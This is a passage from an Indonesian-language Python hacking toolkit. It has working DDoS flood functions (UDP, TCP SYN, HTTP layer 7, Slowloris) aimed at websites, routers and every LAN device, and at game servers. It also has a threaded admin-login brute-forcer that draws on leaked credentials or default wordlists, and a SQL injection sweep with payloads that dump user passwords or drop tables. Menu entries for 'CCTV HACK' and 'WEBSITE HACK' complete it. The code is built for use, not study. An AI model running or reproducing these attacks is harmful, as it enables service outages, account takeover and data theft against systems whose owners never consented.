            # - Halaman acak lain dikirim per batch 19, silent sampai selesai
            BARIS_CHUNK = 97
            BATCH_ACAK  = 19
            all_ai_files = []

            main_src    = html_sources[0] if html_sources else ""
            acak_pages  = html_sources[1:]   # semua selain main
            main_lines  = main_src.splitlines(keepends=True)
            main_chunks = [
                "".join(main_lines[i:i+BARIS_CHUNK])
                for i in range(0, len(main_lines), BARIS_CHUNK)
            ] if main_lines else []

            total_main_chunk = len(main_chunks)
            total_acak_batch = (len(acak_pages) + BATCH_ACAK - 1) // BATCH_ACAK if acak_pages else 0
            total_kirim      = total_main_chunk + total_acak_batch

            print(f"  {M}[L5] HTML main: {len(main_lines)} baris → {total_main_chunk} chunk (@{BARIS_CHUNK} baris){N}")
            print(f"  {M}[L5] Halaman acak: {len(acak_pages)} → {total_acak_batch} batch (@{BATCH_ACAK} hal){N}")
            print(f"  {C}[L5] Total pengiriman ke AI: {total_kirim} | silent sampai selesai{N}")

            # Kirim chunk HTML main per 97 baris
            for ci, chunk in enumerate(main_chunks):
                label_chunk = f"[MAIN baris {ci*BARIS_CHUNK+1}-{min((ci+1)*BARIS_CHUNK, len(main_lines))}]"
                print(f"  {C}[L5] {label_chunk}...{N}", end="", flush=True)
                src = f"<!-- CHUNK MAIN {ci+1}/{total_main_chunk} -->\n{chunk}"
                ai_files = ai_scan_dan_generate(src, out_dir, base_url)
                all_ai_files.extend(ai_files)
                print(f" {G}✓{N}")

            # Kirim halaman acak per batch 19
            for bi in range(total_acak_batch):
                batch  = acak_pages[bi*BATCH_ACAK:(bi+1)*BATCH_ACAK]
                src    = "\n\n".join(batch)
                start  = bi*BATCH_ACAK + 1
                end    = min((bi+1)*BATCH_ACAK, len(acak_pages))
                print(f"  {C}[L5] [ACAK hal {start}-{end}]...{N}", end="", flush=True)
                ai_files = ai_scan_dan_generate(src, out_dir, base_url)
                all_ai_files.extend(ai_files)
                print(f" {G}✓{N}")

            print(f"  {G}[L5] Selesai — {len(all_ai_files)} file total{N}")

        else:
            # Level 1-4:
            # - HTML main dibaca per 97 baris, tiap chunk dikirim ke AI
            # - + 19 halaman acak/sensitif dalam satu kirim setelahnya
            BARIS_CHUNK = 97
            main_src    = html_sources[0] if html_sources else ""
            acak_pages  = html_sources[1:20]   # max 19 halaman lain
            main_lines  = main_src.splitlines(keepends=True)
            main_chunks = [
                "".join(main_lines[i:i+BARIS_CHUNK])
                for i in range(0, len(main_lines), BARIS_CHUNK)
            ] if main_lines else []

            print(f"  {C}[*] HTML main: {len(main_lines)} baris → {len(main_chunks)} chunk (@{BARIS_CHUNK} baris){N}")
            print(f"  {C}[*] + {len(acak_pages)} halaman acak/sensitif{N}")
            all_ai_files = []

            for ci, chunk in enumerate(main_chunks):
                print(f"  {C}[AI] Chunk main {ci+1}/{len(main_chunks)}...{N}", end="", flush=True)
                src = f"<!-- CHUNK MAIN {ci+1}/{len(main_chunks)} -->\n{chunk}"
                ai_files = ai_scan_dan_generate(src, out_dir, base_url)
                all_ai_files.extend(ai_files)
                print(f" {G}✓{N}")

            if acak_pages:
                print(f"  {C}[AI] Mengirim {len(acak_pages)} halaman acak...{N}", end="", flush=True)
                src = "\n\n".join(acak_pages)
                ai_files = ai_scan_dan_generate(src, out_dir, base_url)
                all_ai_files.extend(ai_files)
                print(f" {G}✓{N}")

            print(f"  {G}[+] AI selesai — {len(all_ai_files)} file total{N}")



    # ── ZIP — hanya kalau ada file ─────────────────────────────────────────────
    total_files = stats["html"] + stats["db"] + stats["asset"] + 1  # +1 recon
    if total_files < 2:
        print(f"\n{R}[!] Tidak ada file yang berhasil disave. ZIP tidak dibuat.{N}")
        print(f"{Y}    Kemungkinan: target block request, require login, atau tidak ada konten.{N}")
        input(f"\n{C}Enter untuk kembali...{N}"); return

    zip_path = os.path.join(tempfile.gettempdir(), f"webhack_{safe_name}_{timestamp}.zip")
    print(f"\n{G}[*] Membuat ZIP ({total_files} file)...{N}")
    try:
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
            for root, dirs, files in os.walk(out_dir):
                for fname in files:
                    fpath   = os.path.join(root, fname)
                    arcname = os.path.relpath(fpath, os.path.dirname(out_dir))
                    try:
                        zf.write(fpath, arcname)
                    except Exception:
                        pass  # skip file bermasalah, lanjut
        # Validasi ZIP tidak corrupt
        with zipfile.ZipFile(zip_path, "r") as zf:
            bad = zf.testzip()
            if bad:
                print(f"{R}[!] ZIP corrupt pada: {bad}{N}")
    except Exception as e:
        print(f"{R}[!] Gagal buat ZIP: {e}{N}")
        input(f"{C}Enter untuk kembali...{N}"); return

    zip_size_kb = os.path.getsize(zip_path) // 1024

    # ── Hasil crawl ───────────────────────────────────────────────────────────
    print(f"\n{G}{BOX_TOP}{N}")
    print(box_header("HASIL CRAWL"))
    print(f"{G}{BOX_BOT}{N}\n")
    print(f"  {W}Target  :{N} {base_url}")
    print(f"  {G}HTML    :{N} {stats['html']} halaman")
    print(f"  {M}DB/CFG  :{N} {stats['db']} file")
    print(f"  {C}Asset   :{N} {stats['asset']} file")
    print(f"  {R}Error   :{N} {stats['error']} URL")
    print(f"\n  {Y}ZIP     :{N} {zip_size_kb} KB")
    if found_db:
        print(f"\n  {M}[!] FILE SENSITIF:{N}")
        for u in found_db:
            print(f"      {R}{u}{N}")

    # ── Auto-download ZIP ke /storage/emulated/0/data ─────────────────────────
    dest_dir = "/storage/emulated/0/data" if os.path.isdir("/storage/emulated/0") else os.path.join(os.getcwd(), "data")
    dest_zip = os.path.join(dest_dir, os.path.basename(zip_path))
    try:
        os.makedirs(dest_dir, exist_ok=True)
        shutil.copy2(zip_path, dest_zip)
        print(f"\n{G}[+] ZIP tersimpan otomatis:{N}")
        print(f"    {Y}{dest_zip}{N}")
    except Exception as e:
        print(f"{R}[!] Gagal simpan ZIP: {e}{N}")
        dest_zip = zip_path

    try: shutil.rmtree(out_dir)
    except: pass

    # ── Menu serangan ─────────────────────────────────────────────────────────
    while True:
        print(f"\n{R}{BOX_TOP}{N}")
        print(box_header("PILIH SERANGAN"))
        print(f"{R}{BOX_BOT}{N}\n")
        print(f"  {R}[1]{N} DDOS")
        print(f"  {R}[2]{N} Hack")
        print(f"  {Y}[0]{N} Kembali")
        atk = input(f"\n{B}Pilih: {N}").strip()

        if atk == "0":
            break

        elif atk == "1":
            # ── DDOS terhadap target ──────────────────────────────────────────
            print(f"\n{R}{BOX_TOP}{N}")
            print(box_header("DDOS TARGET"))
            print(f"{R}{BOX_BOT}{N}\n")
            print(f"  {C}[1]{N} UDP Flood")
            print(f"  {C}[2]{N} TCP SYN Flood")
            print(f"  {C}[3]{N} HTTP Flood (Layer 7)")
            print(f"  {C}[4]{N} Kombinasi semua")
            print(f"  {Y}[0]{N} Kembali")
            dmode = input(f"\n{B}Mode: {N}").strip()
            if dmode == "0":
                continue
            try:
                tc = int(input(f"{C}Jumlah thread (default 100): {N}") or 100)
            except: tc = 100

            DDOS_STOP = threading.Event()
            parsed    = urlparse(base_url)
            host      = parsed.hostname
            port      = parsed.port or (443 if parsed.scheme == "https" else 80)
            path      = parsed.path or "/"

            def _udp_flood_web(stop):
                import socket, random
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1400)
                while not stop.is_set():
                    try: s.sendto(data, (host, random.randint(1, 65535)))
                    except: pass

            def _tcp_flood_web(stop):
                import socket
                while not stop.is_set():
                    try:
                        s = socket.socket()
                        s.settimeout(1)
                        s.connect((host, port))
                        s.send(b"X" * 65535)
                        s.close()
                    except: pass

            def _http_flood_web(stop):
                headers = (
                    f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                    f"User-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
                ).encode()
                while not stop.is_set():
                    try:
                        s = socket.socket()
                        s.settimeout(2)
                        s.connect((host, port))
                        for _ in range(50):
                            s.send(headers)
                        s.close()
                    except: pass

            funcs = {
                "1": _udp_flood_web,
                "2": _tcp_flood_web,
                "3": _http_flood_web,
            }

            targets_fn = list(funcs.values()) if dmode == "4" else [funcs.get(dmode, _http_flood_web)]
            print(f"\n{R}[!] DDOS dimulai ke {host}:{port} — Ctrl+C untuk stop{N}\n")
            for fn in targets_fn:
                for _ in range(tc):
                    threading.Thread(target=fn, args=(DDOS_STOP,), daemon=True).start()
            try:
                sent = 0
                while True:
                    time.sleep(1); sent += tc * len(targets_fn)
                    print(f"\r{R}[~] Paket terkirim ~{sent:,} | thread: {tc*len(targets_fn)}{N}", end="", flush=True)
            except KeyboardInterrupt:
                DDOS_STOP.set()
                print(f"\n{Y}[!] DDOS dihentikan.{N}")

        elif atk == "2":
            # ── Hack — eksploitasi celah dari hasil scan AI ───────────────────
            print(f"\n{R}{BOX_TOP}{N}")
            print(box_header("HACK TARGET"))
            print(f"{R}{BOX_BOT}{N}\n")
            print(f"  {C}[1]{N} Brute-force login admin (dari data bocor / wordlist)")
            print(f"  {C}[2]{N} SQL Injection — paksa dump data")
            print(f"  {C}[3]{N} Kombinasi — brute + SQLi + data exfil")
            print(f"  {Y}[0]{N} Kembali")
            hmode = input(f"\n{B}Mode: {N}").strip()
            if hmode == "0": continue

            # Baca akun admin bocor kalau ada
            admin_file = os.path.join(dest_dir.replace("/data",""), "data",
                         f"webhack_{safe_name}_{timestamp}", "recon", "akun_admin_bocor.txt")
            creds_dari_scan = []
            try:
                bocor_path = os.path.join(
                    os.path.dirname(dest_zip),
                    f"webhack_{safe_name}_{timestamp}", "recon", "akun_admin_bocor.txt"
                )
                if os.path.exists(bocor_path):
                    with open(bocor_path) as bf:
                        for line in bf:
                            parts = [p.strip() for p in line.split("|")]
                            if len(parts) >= 3 and parts[0].startswith("http"):
                                creds_dari_scan.append({
                                    "url": parts[0], "user": parts[1], "pass": parts[2]
                                })
            except: pass

            if creds_dari_scan:
                print(f"\n  {G}[+] {len(creds_dari_scan)} kredensial dari scan AI ditemukan — dipakai duluan{N}")

            hack_results = []
            hack_out     = os.path.join(dest_dir, f"hack_{safe_name}_{timestamp}.txt")
            os.makedirs(dest_dir, exist_ok=True)

            # ── Brute-force login ─────────────────────────────────────────────
            if hmode in ("1", "3"):
                login_urls = [c["url"] for c in creds_dari_scan] or [base_url + p for p in
                    ["/admin/login", "/admin", "/wp-login.php", "/login", "/signin",
                     "/auth/login", "/administrator", "/panel", "/dashboard"]]

                wordlist_user = [c["user"] for c in creds_dari_scan] or ["admin","administrator","root","user","test","manager"]
                wordlist_pass = [c["pass"] for c in creds_dari_scan] or ["admin","password","123456","admin123","pass","root","test","1234"]

                print(f"\n  {M}[HACK] Brute-force login — {len(login_urls)} endpoint × {len(wordlist_user)*len(wordlist_pass)} kombo{N}")
                bf_lock  = threading.Lock()
                bf_found = []

                def _try_login(args):
                    lurl, user, passwd = args
                    try:
                        data    = urllib.parse.urlencode({"username": user, "password": passwd,
                                  "user": user, "pass": passwd, "email": user,
                                  "log": user, "pwd": passwd}).encode()
                        req     = urllib.request.Request(lurl, data=data, method="POST")
                        req.add_header("Content-Type", "application/x-www-form-urlencoded")
                        req.add_header("User-Agent", "Mozilla/5.0")
                        req.add_header("Accept", "text/html,application/json")
                        with urllib.request.urlopen(req, timeout=8) as r:
                            body = r.read(4096).decode("utf-8", errors="replace").lower()
                            code = r.getcode()
                            final_url = r.geturl()
                        # Tanda berhasil: redirect ke dashboard, atau tidak ada "invalid/error" di body
                        success = (
                            code in (200, 302) and
                            not any(x in body for x in ["invalid","incorrect","failed","error","wrong","gagal"]) and
                            any(x in body for x in ["dashboard","welcome","logout","berhasil","sukses","profile","panel"])
                            or final_url != lurl
                        )
                        if success:
                            with bf_lock:
                                entry = f"LOGIN BERHASIL | {lurl} | {user} | {passwd}"
                                bf_found.append(entry)
                                hack_results.append(entry)
                                print(f"\n  {G}✓ {entry}{N}")
                    except: pass

                combos = [(lu, u, p) for lu in login_urls for u in wordlist_user for p in wordlist_pass]
                with ThreadPoolExecutor(max_workers=50) as px:
                    list(px.map(_try_login, combos))

                if not bf_found:
                    print(f"  {Y}[HACK] Brute-force tidak berhasil menemukan akun.{N}")

            # ── SQL Injection ─────────────────────────────────────────────────
            if hmode in ("2", "3"):
                print(f"\n  {M}[HACK] SQL Injection scan...{N}")
                sqli_payloads = [
                    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
                    "\" OR \"1\"=\"1", "admin'--", "' UNION SELECT 1,2,3--",
                    "' UNION SELECT username,password,3 FROM users--",
                    "1' AND SLEEP(3)--", "1; DROP TABLE users--",
                    "' OR 'x'='x", "') OR ('1'='1",
                ]
                sqli_params  = ["id","user","username","page","search","q","login","email","name"]
                sqli_results = []
                sqli_lock    = threading.Lock()

                def _sqli_try(args):
                    param, payload = args
                    for method in ("GET", "POST"):
                        try:
                            encoded = urllib.parse.urlencode({param: payload})
                            if method == "GET":
                                url_ = base_url + "/?" + encoded
                                req  = urllib.request.Request(url_)
                            else:
                                req  = urllib.request.Request(base_url, data=encoded.encode())
                                req.add_header("Content-Type","application/x-www-form-urlencoded")
                            req.add_header("User-Agent","Mozilla/5.0")
                            with urllib.request.urlopen(req, timeout=8) as r:
                                body = r.read(8192).decode("utf-8", errors="replace")
                            # Tanda SQLi berhasil
                            indicators = [
                                "sql syntax","mysql_fetch","ORA-","pg_query",
                                "Warning: mysql","SQLSTATE","syntax error",
                                "unclosed quotation","Microsoft OLE DB",
                            ]
                            found_ind = [i for i in indicators if i.lower() in body.lower()]
                            if found_ind:
                                with sqli_lock:
                                    entry = f"SQLI | {method} {param}={payload} | indikator: {','.join(found_ind)}"
                                    sqli_results.append(entry)
                                    hack_results.append(entry)
                                    print(f"  {R}✓ {entry[:90]}{N}")
                        except: pass

                combos_sqli = [(p, pl) for p in sqli_params for pl in sqli_payloads]
                with ThreadPoolExecutor(max_workers=30) as px:
                    list(px.map(_sqli_try, combos_sqli))

                if not sqli_results:
                    print(f"  {Y}[HACK] Tidak ada celah SQLi terdeteksi.{N}")

            # ── Simpan hasil hack ke file txt ─────────────────────────────────
            if hack_results:
                with open(hack_out, "w", encoding="utf-8") as hf:
                    hf.write(f"=== HASIL HACK — {base_url} ===\n")
                    hf.write(f"Waktu   : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    hf.write(f"{'='*50}\n\n")
                    for r in hack_results:
                        hf.write(r + "\n")
                print(f"\n  {G}[+] Hasil tersimpan:{N} {hack_out}")
            else:
                print(f"\n  {Y}[!] Tidak ada celah yang berhasil dieksploitasi.{N}")

    input(f"\n{C}Enter untuk kembali ke menu...{N}")

# ─── MENU FUNCTIONS ───────────────────────────────────────────────────────────

def ddos_wifi():
    clear(); print_banner()
    print(f"{G}{BOX_TOP}{N}"); print(box_header('DDOS WIFI')); print(f"{G}{BOX_BOT}{N}\n")
    WIFI_STOP = threading.Event()
    gw = input(f"{G}IP Gateway (Enter = 192.168.1.1): {N}").strip() or "192.168.1.1"
    hosts = scan_jaringan(gw)
    if not hosts:
        print(f"{R}[!] Tidak ada device ditemukan.{N}")
        input(f"{C}Enter untuk kembali...{N}"); return
    tampilkan_hosts(hosts)
    print(f"{Y}  [0]{N} SEMUA  — serang router + seluruh device")
    try:
        n = int(input(f"\n{B}Pilih target (0 = semua, 1-{len(hosts)}): {N}"))
        if not (0 <= n <= len(hosts)): return
    except: return
    if n == 0:
        targets = [gw] + [h["ip"] for h in hosts]; label = f"ROUTER + {len(hosts)} device"
    else:
        targets = [hosts[n-1]["ip"]]; label = targets[0]
    print(f"\n{G}[+] Target: {B}{label}{N}\n")
    print(f"{C}[1]{N} UDP Multi-Port Flood")
    print(f"{C}[2]{N} TCP Connection Flood")
    print(f"{C}[3]{N} Slowloris (port 80)")
    print(f"{C}[4]{N} Kombinasi semua")
    mode = input(f"\n{B}Mode (1-4): {N}").strip()
    tc   = int(input(f"{C}Thread per target (default 50): {N}") or 50)
    if mode not in ("1","2","3","4"):
        print(f"{R}[!] Mode tidak valid.{N}"); return
    def launch(target_ip, tc):
        if mode=="1":
            for _ in range(tc): threading.Thread(target=udp_multiport,args=(target_ip,WIFI_STOP),daemon=True).start()
        elif mode=="2":
            for _ in range(tc): threading.Thread(target=tcp_flood,args=(target_ip,WIFI_STOP),daemon=True).start()
        elif mode=="3":
            threading.Thread(target=slowloris,args=(target_ip,80,WIFI_STOP),daemon=True).start()
        elif mode=="4":
            for _ in range(tc//2): threading.Thread(target=udp_multiport,args=(target_ip,WIFI_STOP),daemon=True).start()
            for _ in range(tc//2): threading.Thread(target=tcp_flood,args=(target_ip,WIFI_STOP),daemon=True).start()
            threading.Thread(target=slowloris,args=(target_ip,80,WIFI_STOP),daemon=True).start()
    for ip in targets:
        launch(ip, tc); print(f"{G}[+] Launched → {ip}{N}")
    print(f"\n{G}[+] Serangan berjalan ke {label}. Ctrl+C untuk berhenti.{N}\n")
    try:
        while True: time.sleep(3)
    except KeyboardInterrupt:
        WIFI_STOP.set(); print(f"\n{G}[+] Dihentikan.{N}")

def ddos_web():
    clear(); print_banner()
    print(f"{G}{BOX_TOP}{N}"); print(box_header('DDOS WEB')); print(f"{G}{BOX_BOT}{N}\n")
    WEB_STOP = threading.Event()
    url = input(f"{C}URL: {N}").strip()
    if not url.startswith("http"): url = "https://" + url
    parsed = urlparse(url); host = parsed.hostname
    try: ip = socket.gethostbyname(host)
    except:
        print(f"{R}[!] Resolve gagal.{N}"); input(f"{C}Enter...{N}"); return
    port = parsed.port or (443 if parsed.scheme=="https" else 80)
    print(f"{G}[+] {host} → {ip}:{port}{N}")
    tc = int(input(f"{C}Thread (default 100): {N}") or 100)
    def _http(url):
        while not WEB_STOP.is_set():
            try:
                p2=urlparse(url); h=p2.hostname; pp=p2.port or (443 if p2.scheme=="https" else 80)
                s=socket.socket(); s.connect((h,pp))
                ua=random.choice(["Mozilla/5.0 (Linux; Android 13)","Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)"])
                s.sendall((f"GET /?r={random.randint(1,999999)} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {ua}\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n").encode())
                s.close()
            except: pass
    for _ in range(tc): threading.Thread(target=_http,args=(f"{parsed.scheme}://{host}",),daemon=True).start()
    print(f"{G}[+] Web flood berjalan...{N}\n")
    try:
        while True: time.sleep(3)
    except KeyboardInterrupt:
        WEB_STOP.set(); print(f"\n{G}[+] Dihentikan.{N}")

def ddos_game():
    clear(); print_banner()
    print(f"{G}{BOX_TOP}{N}"); print(box_header('DDOS GAME')); print(f"{G}{BOX_BOT}{N}\n")
    GAME_STOP = threading.Event()
    target = input(f"{C}IP Target: {N}").strip()
    port   = int(input(f"{C}Port (default 25565): {N}") or 25565)
    tc     = int(input(f"{C}Thread (default 100): {N}") or 100)
    def _udp(ip,p):
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); payload=os.urandom(1400)
        while not GAME_STOP.is_set():
            try: s.sendto(payload,(ip,p))
            except: pass
    for _ in range(tc): threading.Thread(target=_udp,args=(target,port),daemon=True).start()
    print(f"{G}[+] Game flood berjalan ke {target}:{port}...{N}\n")
    try:
        while True: time.sleep(3)
    except KeyboardInterrupt:
        GAME_STOP.set(); print(f"\n{G}[+] Dihentikan.{N}")

# ─── MENU UTAMA ───────────────────────────────────────────────────────────────

def menu_utama():
    while True:
        clear(); print_banner()
        print(f"{G}{BOX_TOP}{N}"); print(box_header('MENU UTAMA')); print(f"{G}{BOX_BOT}{N}")
        print(f"{C}[1]{N} DDOS WEB")
        print(f"{C}[2]{N} DDOS WIFI")
        print(f"{C}[3]{N} DDOS GAME")
        print(f"{M}[4]{N} CCTV HACK")
        print(f"{R}[5]{N} WEBSITE HACK")
        print(f"{Y}[0]{N} EXIT")
        p = input(f"\n{B}Pilih: {N}").strip()
        if   p=="1": ddos_web()
        elif p=="2": ddos_wifi()
        elif p=="3": ddos_game()
        elif p=="4": cctv_hack()
        elif p=="5": website_hack()
        elif p=="0": sys.exit(0)

if __name__ == "__main__":
    try:
        menu_utama()
    except KeyboardInterrupt:
        stop_ffmpeg_bridge(); stop_mediamtx()
        print(f"\n{G}[+] Keluar.{N}")
        sys.exit(0)
